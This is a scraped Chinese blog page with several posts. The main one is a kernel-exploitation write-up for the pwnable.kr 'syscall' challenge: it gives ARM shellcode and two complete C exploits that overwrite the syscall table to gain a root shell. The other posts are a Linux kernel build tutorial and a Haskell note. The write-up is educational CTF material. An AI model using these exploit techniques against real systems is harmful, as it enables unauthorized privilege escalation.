<h3 id="Lambda抽象"><a href="#Lambda抽象" class="headerlink" title="Lambda抽象"></a>Lambda抽象</h3><ul>
<li><p>你可以通过lambda实现匿名函数</p>
</li>
<li><p>符号是： \<em>variable(s)</em> -&gt; <em>body</em> ( \被称为&quot;lambda&quot;)</p>
</li>
<li><p>案例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">countLowercaseAndDigits :: String -&gt; Int</div><div class="line">countLowercaseAndDigits = length . filter (\c -&gt; isLower c || isDigit c)</div></pre></td></tr></table></figure>
</li>
<li><p>lambda使用模式匹配能够分解值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">... (\(Right x) -&gt; x) ...</div></pre></td></tr></table></figure>
<ul>
<li>But note that guards or multiple bindings are not allowed</li>
<li>Patterns must have the right constructor or will get run-time error</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/14/kernel-exploit简介/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/10/14/kernel-exploit简介/" itemprop="url">kernel exploit简介</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-14T19:16:25+08:00">
                2017-10-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1、Linux内核exploit介绍"><a href="#1、Linux内核exploit介绍" class="headerlink" title="1、Linux内核exploit介绍"></a>1、Linux内核exploit介绍</h3><p>在linux下，整个内存空间中，只有一部分低地址是进程可访问的，而高地址处则是属于内核。例如，在x86的机器上，<code>0x00000000</code>到<code>0xbfffffff</code>是属于进程的，而<code>0xc0000000</code>到<code>0xffffffff</code>这1 GB是属于内核的。</p>
<p>出于安全考虑，进程无法访问属于内核的内存，否则恶意进程就有可能对系统内核的内存进行读取或者篡改。反过来，属于进程的内存，是可以被内核访问的。特别地，在内核太可以跳转执行用户空间中的代码。（不过，在某些硬件上，比如较新的Core CPU，Intel加入了SMEP等保护功能，限制了内核执行用户空间代码的操作）</p>
<p>内核空间的exploit，本质上与用户空间的exploit是相同的：都是修改执行流程，达到我们的目的。一般来说，用户空间的exploit，其目的是获取shell；而内核空间的exploit，其目的则是提升权限，获取对系统的完全控制。</p>
<p>Linux系统下，每个进程拥有其对应的<code>struct cred</code>，用于记录该进程的uid。内核exploit的目的，便是修改当前进程的cred，从而提升权限。当然，进程本身是无法篡改自己的cred的，我们需要在内核空间中，通过以下方式来达到这一目的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">commit_creds(prepare_kernel_cred(0));</div></pre></td></tr></table></figure>
<p>其中，<code>prepare_kernel_cred()</code>创建一个新的cred，参数为0则将cred中的uid, gid设置为0，对应于root用户。随后，<code>commit_creds()</code>将这个cred应用于当前进程。此时，进程便提升到了root权限。</p>
<p>这些方法的地址，可以通过<code>/proc/kallsyms</code>获取。不过，有时为了安全，管理员会隐藏内核符号的地址，此时便无法通过这一方式获取地址。</p>
<p>提升权限后，我们还需要返回到用户空间。在这里，我们可以运行shell，从而以root身份执行任意命令了。</p>
<h3 id="2、范例——pwnable-kr-syscall"><a href="#2、范例——pwnable-kr-syscall" class="headerlink" title="2、范例——pwnable.kr: syscall"></a>2、范例——pwnable.kr: syscall</h3><p>在pwnable.kr上有一道题，syscall，就可以作为内核exploit的入门</p>
<p>其中将syscall.c编译进了内核</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">// adding a new system call : sys_upper</div><div class="line"></div><div class="line">#include &lt;linux/module.h&gt;</div><div class="line">#include &lt;linux/kernel.h&gt;</div><div class="line">#include &lt;linux/slab.h&gt;</div><div class="line">#include &lt;linux/vmalloc.h&gt;</div><div class="line">#include &lt;linux/mm.h&gt;</div><div class="line">#include &lt;asm/unistd.h&gt;</div><div class="line">#include &lt;asm/page.h&gt;</div><div class="line">#include &lt;linux/syscalls.h&gt;</div><div class="line"></div><div class="line">#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!</div><div class="line">#define NR_SYS_UNUSED		223</div><div class="line"></div><div class="line">//Pointers to re-mapped writable pages</div><div class="line">unsigned int** sct;</div><div class="line"></div><div class="line">asmlinkage long sys_upper(char *in, char* out)&#123;</div><div class="line">	int len = strlen(in);</div><div class="line">	int i;</div><div class="line">	for(i=0; i&lt;len; i++)&#123;</div><div class="line">		if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a)&#123;</div><div class="line">			out[i] = in[i] - 0x20;</div><div class="line">		&#125;</div><div class="line">		else&#123;</div><div class="line">			out[i] = in[i];</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static int __init initmodule(void )&#123;</div><div class="line">	sct = (unsigned int**)SYS_CALL_TABLE;</div><div class="line">	sct[NR_SYS_UNUSED] = sys_upper;</div><div class="line">	printk(&quot;sys_upper(number : 223) is added\n&quot;);</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void __exit exitmodule(void )&#123;</div><div class="line">	return;</div><div class="line">&#125;</div><div class="line"></div><div class="line">module_init( initmodule );</div><div class="line">module_exit( exitmodule );</div></pre></td></tr></table></figure>
<h4 id="2-1-问题分析"><a href="#2-1-问题分析" class="headerlink" title="2.1 问题分析"></a>2.1 问题分析</h4><p>你会发现这道题目提供了一个编写的内核模块源码，其中添加了一个syscall，其执行的逻辑基本与<code>strcpy()</code>相同，只是会将小写字母变为大写字母。</p>
<p>那么，这里的漏洞就很明显了，基本上就是一个向任意地址写任意内容的漏洞，只要写入的内容不包含小写字母。接下来，就是如何利用这个syscall，获取root权限，从而读取flag文件。</p>
<p>系统调用的地址存在<code>0x8000e348+223 = 0x8000e6c4</code>, flag在<code>/root/flag</code></p>
<h4 id="2-2-解题思路"><a href="#2-2-解题思路" class="headerlink" title="2.2 解题思路"></a>2.2 解题思路</h4><p>首先修改 223 号系统调用的内容，然后调用这个修改过的 223 号系统调用，在 kernel space 把 uid 改掉，之后在 user space <code>execve()</code>就好了。</p>
<h4 id="2-3-解题步骤"><a href="#2-3-解题步骤" class="headerlink" title="2.3 解题步骤"></a>2.3 解题步骤</h4><p>在现在版本的 Linux 内核修改 uid，需要通过<code>prepare_creds()</code>和<code>commit_creds()</code>两步<a href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/#fn:2" target="_blank" rel="external">参考2</a>。这两个函数的地址存在<code>/proc/kallsyms</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat /proc/kallsyms | grep &apos;prepare_creds\|commit_creds&apos;</div><div class="line">8003f44c T prepare_creds</div><div class="line">8003f56c T commit_creds</div><div class="line">...</div></pre></td></tr></table></figure>
<p>参考 <a href="https://github.com/acama" target="_blank" rel="external">@acama</a> 的版本<a href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/#fn:3" target="_blank" rel="external"> 参考3</a>写了一个( <a href="https://github.com/acama" target="_blank" rel="external">@acama</a> 的版本<code>prepare_creds()</code>之后直接就<code>commit_creds()</code>, 这估计只在老版本可以).<code>prepare_creds()</code>返回的结构体定义可以看<a href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/#fn:4" target="_blank" rel="external">参考4</a>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">@ prepare_creds and commit_creds</div><div class="line">.section .text</div><div class="line">.global _start</div><div class="line">_start:</div><div class="line">    push &#123;lr&#125;</div><div class="line"></div><div class="line">    mov r0, #0</div><div class="line">    ldr r3, =0x8003f44c  @ prepare_creds()</div><div class="line">    blx r3</div><div class="line"></div><div class="line">    push &#123;r0&#125;</div><div class="line">    sub r1, r1, r1</div><div class="line">    add r0, #4</div><div class="line">    str r1, [r0], #4  @ set uid, euid, gid, etc</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line">    str r1, [r0], #4</div><div class="line"></div><div class="line">    pop &#123;r0&#125;</div><div class="line">    ldr r3, =0x8003f56c  @ commit_creds(r0)</div><div class="line">    blx r3</div><div class="line"></div><div class="line">    pop &#123;lr&#125;</div><div class="line">    bx lr</div></pre></td></tr></table></figure>
<p>这个生成的指令是不能用原先的 223 号系统调用直接写进内存的，所以我准备了一个真正的<code>write-anything-anywhere</code>的跳板:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">@ Write anything anywhere</div><div class="line"></div><div class="line">.section .text</div><div class="line">.global _start</div><div class="line">_start:</div><div class="line"></div><div class="line">lp:</div><div class="line">    ldrb r3, [r0], #1</div><div class="line">    strb r3, [r1], #1</div><div class="line">    subs r2, r2, #1</div><div class="line">    bge lp</div><div class="line"></div><div class="line">    bx lr</div></pre></td></tr></table></figure>
<p>先把 waa 写进内存，然后把 cred 写进内存。至于写到哪里，我随手写了两个地址: 0x83f5cafe, 0x83f6beee.</p>
<h4 id="2-4-exp集锦"><a href="#2-4-exp集锦" class="headerlink" title="2.4 exp集锦"></a>2.4 exp集锦</h4><p>参考: <a href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/" target="_blank" rel="external">https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">char cred[] = &quot;\x04\xe0\x2d\xe5\x00\x00\xa0\xe3\x40\x30\x9f\xe5\x33\xff\x2f\xe1\x04\x00\x2d\xe5\x01\x10\x41\xe0\x04\x00\x80\xe2\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x00\x9d\xe4\x0c\x30\x9f\xe5\x33\xff\x2f\xe1\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x4c\xf4\x03\x80\x6c\xf5\x03\x80&quot;;</div><div class="line">char waa[] = &quot;\x01\x30\xd0\xe4\x01\x30\xc1\xe4\x01\x20\x52\xe2\xfb\xff\xff\xaa\x1e\xff\x2f\xe1&quot;;</div><div class="line"></div><div class="line">char addr1[] = &quot;\xfe\xca\xf5\x83&quot;;</div><div class="line">char addr2[] = &quot;\xee\xbe\xf6\x83&quot;;</div><div class="line"></div><div class="line">int ret;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    asm volatile (</div><div class="line">        &quot;mov r0, %1\n&quot;</div><div class="line">        &quot;mov r1, %2\n&quot;</div><div class="line">        &quot;mov r7, #223\n&quot;</div><div class="line">        &quot;svc #0\n&quot;</div><div class="line">        &quot;mov r0, %3\n&quot;</div><div class="line">        &quot;mov r1, %4\n&quot;</div><div class="line">        &quot;mov r7, #223\n&quot;</div><div class="line">        &quot;svc #0\n&quot;</div><div class="line">        &quot;mov %0, r0&quot;</div><div class="line">        : &quot;=r&quot; (ret)</div><div class="line">        : &quot;r&quot; (waa), &quot;r&quot; (0x83f5cafe),</div><div class="line">          &quot;r&quot; (addr1), &quot;r&quot; (0x8000e6c4)</div><div class="line">        : &quot;r0&quot;, &quot;r1&quot;, &quot;r2&quot;, &quot;r3&quot;, &quot;lr&quot;</div><div class="line">    );</div><div class="line">    printf(&quot;return value: %x\n&quot;, ret);</div><div class="line"></div><div class="line">    asm volatile (</div><div class="line">        &quot;mov r0, %1\n&quot;</div><div class="line">        &quot;mov r1, %2\n&quot;</div><div class="line">        &quot;mov r2, %3\n&quot;</div><div class="line">        &quot;mov r7, #223\n&quot;</div><div class="line">        &quot;svc #0\n&quot;</div><div class="line">        &quot;mov r0, %4\n&quot;</div><div class="line">        &quot;mov r1, %5\n&quot;</div><div class="line">        &quot;mov r2, %6\n&quot;</div><div class="line">        &quot;mov r7, #223\n&quot;</div><div class="line">        &quot;svc #0\n&quot;</div><div class="line">        &quot;mov %0, r0&quot;</div><div class="line">        : &quot;=r&quot; (ret)</div><div class="line">        : &quot;r&quot; (cred), &quot;r&quot; (0x83f6beee), &quot;r&quot; (89),</div><div class="line">          &quot;r&quot; (addr2), &quot;r&quot; (0x8000e6c4), &quot;r&quot; (5),</div><div class="line">          &quot;r&quot; (0)</div><div class="line">        : &quot;r0&quot;, &quot;r1&quot;, &quot;r2&quot;, &quot;r3&quot;, &quot;r5&quot;, &quot;lr&quot;</div><div class="line">    );</div><div class="line">    printf(&quot;return value: %x\n&quot;, ret);</div><div class="line"></div><div class="line">    asm volatile (</div><div class="line">        &quot;mov r7, #223\n&quot;</div><div class="line">        &quot;svc #0\n&quot;</div><div class="line">        &quot;mov %0, r0&quot;</div><div class="line">        : &quot;=r&quot; (ret)</div><div class="line">        :</div><div class="line">        : &quot;r0&quot;, &quot;r1&quot;, &quot;r3&quot;, &quot;lr&quot;</div><div class="line">    );</div><div class="line"></div><div class="line">    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>参考: <a href="http://w0lfzhang.me/2017/04/27/pwnable-syscall/" target="_blank" rel="external">http://w0lfzhang.me/2017/04/27/pwnable-syscall/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">//gcc -o solver solver.c -std=c99</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#define SYS_CALL_TABLE 0x8000e348</div><div class="line">#define PREPARE_KERNEL_CRED 0x8003f924</div><div class="line">//0x8003f56c  &apos;6c&apos; is low_case, so adding padding to &apos;60&apos;</div><div class="line">#define COMMIT_CREDS 0x8003f560</div><div class="line">#define SYS_EMPTY_A 188</div><div class="line">#define SYS_EMPTY_B 189</div><div class="line">int main() &#123;</div><div class="line">    unsigned int* sct = (unsigned int*)SYS_CALL_TABLE;</div><div class="line">    char nop[] = &quot;\x01\x10\xa0\xe1&quot;;  //rasm2 -a arm &apos;mov r1,r1&apos;</div><div class="line">    char buf[20];</div><div class="line">    for (int i = 0; i &lt; 12; i++) &#123;</div><div class="line">        buf[i] = nop[i % 4];</div><div class="line">    &#125;</div><div class="line">    buf[12] = 0;</div><div class="line">    syscall(223, buf, COMMIT_CREDS);</div><div class="line">    puts(&quot;Stage 1 - add padding&quot;);</div><div class="line">    syscall(223, &quot;\x24\xf9\x03\x80&quot;, sct + SYS_EMPTY_A);</div><div class="line">    syscall(223, &quot;\x60\xf5\x03\x80&quot;, sct + SYS_EMPTY_B);</div><div class="line">    puts(&quot;Stage 2 - overwrite syscall table&quot;);</div><div class="line">    syscall(SYS_EMPTY_B, syscall(SYS_EMPTY_A, 0));</div><div class="line">    puts(&quot;Stage 3 - set new cred&quot;);</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/14/Linux内核编译/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/10/14/Linux内核编译/" itemprop="url">Linux内核编译</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-14T01:10:40+08:00">
                2017-10-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/编译原理/" itemprop="url" rel="index">
                    <span itemprop="name">编译原理</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Linux内核是操作系统的核心，也是操作系统最基本的部分。</p>
<p>Linux内核的体积结构是单内核的、但是他充分采用了微内核的设计思想、使得虽然是单内核、但工作在模块化的方式下、并且这个模块可以动态装载或卸 载；Linux负责管理系统的进程、内存、设备驱动程序、文件和网络系统，决定着系统的性能和稳定性。如是我们在了解Linux内核的基础上根据自己的需 要、量身定制一个更高效，更稳定的内核，就需要我们手动去编译和配置内核里的各项相关的参数和信息了。<br><strong>注意：如果两个内核模块的版本不完全相同是不可以跨版本使用的。</strong></p>
<h3 id="1、编译内核"><a href="#1、编译内核" class="headerlink" title="1、编译内核"></a>1、编译内核</h3><h4 id="1-1-下载并解压内核文件"><a href="#1-1-下载并解压内核文件" class="headerlink" title="1.1 下载并解压内核文件"></a>1.1 下载并解压内核文件</h4><p> 首先我们要去获得Linux内核的压缩文件、获得的路径很多了、最直接的就是去内核官网获得了(<a href="http://www.kernel.org)，也可以到各镜像站上去下载。此处使用的是[https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.xz](https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.xz)" target="_blank" rel="external">http://www.kernel.org)，也可以到各镜像站上去下载。此处使用的是[https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.xz](https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.xz)</a></p>
<p><strong>注意：一般而言，需要编译的linux内核的源码放在/usr/src目录下。</strong></p>
<blockquote>
<p>wget <a href="https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.gz" target="_blank" rel="external">https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.gz</a><br>sudo tar -zxvf linux-3.16.tar.gz -C /usr/src/</p>
</blockquote>
<h4 id="1-2-编译前准备"><a href="#1-2-编译前准备" class="headerlink" title="1.2 编译前准备"></a>1.2 编译前准备</h4><p>需要确保系统安装了gcc，ncurses，bc，make，并且系统包需要更新到最新版</p>
<blockquote>
<p>sudo apt-get install gcc<br>sudo apt-get install libncurses5-dev<br>sudo apt-get update<br>sudo apt-get upgrade<br>sudo apt-get install make<br>sudo apt-get install bc</p>
</blockquote>
<h4 id="1-3-配置内核"><a href="#1-3-配置内核" class="headerlink" title="1.3 配置内核"></a>1.3 配置内核</h4><p>方法很多，比较常用的是</p>
<blockquote>
<p>make menuconfig</p>
<p>make</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">make config：遍历选择所要编译的内核特性</div><div class="line">make allyesconfig：配置所有可编译的内核特性</div><div class="line">make allnoconfig：并不是所有的都不编译，而是能选的都回答为NO、只有必须的都选择为yes。</div><div class="line">make menuconfig：这种就是打开一个文件窗口选择菜单，这个命令需要打开的窗口大于80字符的宽度，打开后就可以在里面选择要编译的项了</div><div class="line"></div><div class="line">下面两个是可以用鼠标点选择的，比较方便：</div><div class="line">make kconfig(KDE桌面环境下，并且安装了qt开发环境)</div><div class="line">make gconfig(Gnome桌面环境，并且安装gtk开发环境)</div><div class="line"></div><div class="line">make menuconfig：使用这个命令的话，如果是新安装的系统就要安装gcc和ncurses-devel这两个包才可以打开，然后在里面选择就可以了。此方法使用较多</div></pre></td></tr></table></figure>
<h4 id="1-4-安装或更新内核"><a href="#1-4-安装或更新内核" class="headerlink" title="1.4 安装或更新内核"></a>1.4 安装或更新内核</h4><blockquote>
<p>make modules_install install</p>
</blockquote>
<p>如果/boot目录下有下面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">System.map-3.16.0</div><div class="line">vmlinuz-3.16.0</div><div class="line">initrd.img-3.16.0</div><div class="line">config-3.16.0</div></pre></td></tr></table></figure>
<p>代表已经成功编译了。</p>
<p>重启系统</p>
<blockquote>
<p> shutdown -r now</p>
</blockquote>
<h4 id="1-5-验证"><a href="#1-5-验证" class="headerlink" title="1.5 验证"></a>1.5 验证</h4><blockquote>
<p> uname -r</p>
</blockquote>
<p>查看内核是否发生改变</p>
<h3 id="2、-向内核中添加自定义的syscall函数"><a href="#2、-向内核中添加自定义的syscall函数" class="headerlink" title="2、 向内核中添加自定义的syscall函数"></a>2、 向内核中添加自定义的syscall函数</h3><p>这部分参考的是文章 <a href="https://tssurya.wordpress.com/2014/08/19/adding-a-hello-world-system-call-to-linux-kernel-3-16-0/" target="_blank" rel="external">Adding a Hello World System Call to Linux kernel 3.16.0</a></p>
<h4 id="2-1-下载并解压内核文件"><a href="#2-1-下载并解压内核文件" class="headerlink" title="2.1 下载并解压内核文件"></a>2.1 下载并解压内核文件</h4><h4 id="2-2-定义新的系统函数sys-hello"><a href="#2-2-定义新的系统函数sys-hello" class="headerlink" title="2.2 定义新的系统函数sys_hello"></a>2.2 定义新的系统函数sys_hello</h4><p>a) 创建hello.c文件</p>
<blockquote>
<p>cd /usr/src/linux-3.16</p>
<p>mkdir hello</p>
<p>cd hello</p>
<p>vim hello.c</p>
</blockquote>
<p>/usr/src/linux-3.16/hello/hello.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_hello</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">        printk(<span class="string">"Hello world\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>b) 创建Makefile</p>
<blockquote>
<p>vim Makefile</p>
</blockquote>
<p>/usr/src/linux-3.16/hello/Makefile</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">obj-y := hello.o</div></pre></td></tr></table></figure>
<p>c) 修改内核的Makefile</p>
<p>修改linux-3.16文件目录下的Makefile，将842行的&quot;<em>core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/</em> &quot;</p>
<p>修改为&quot;<em>core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ hello/</em>&quot;</p>
<p>d) 修改syscall_32.tbl文件（如果是64位系统，就应该修改syscall\_64.tbl）</p>
<blockquote>
<p><em>cd arch/x86/syscalls</em></p>
<p>vim syscall_32.tbl</p>
</blockquote>
<p>在接近末尾处，添加一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">354    i386    hello    sys_hello</div></pre></td></tr></table></figure>
<p>其中354指的是系统调用号，i386指的是系统类型，sys_hello指的是系统函数</p>
<p>e) 修改对应的头文件syscalls.h</p>
<blockquote>
<p><em>cd  include/linux/</em></p>
<p>vim syscalls.h</p>
</blockquote>
<p>在末尾处，添加一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">asmlinkage long sys_hello(void);</div></pre></td></tr></table></figure>
<h4 id="2-3-编译前准备"><a href="#2-3-编译前准备" class="headerlink" title="2.3 编译前准备"></a>2.3 编译前准备</h4><h4 id="2-4-配置内核"><a href="#2-4-配置内核" class="headerlink" title="2.4 配置内核"></a>2.4 配置内核</h4><h4 id="2-5-安装或更新内核"><a href="#2-5-安装或更新内核" class="headerlink" title="2.5 安装或更新内核"></a>2.5 安装或更新内核</h4><h4 id="2-6-检验系统调用函数是否成功编译"><a href="#2-6-检验系统调用函数是否成功编译" class="headerlink" title="2.6 检验系统调用函数是否成功编译"></a>2.6 检验系统调用函数是否成功编译</h4><p>随便写一个test.c文件</p>
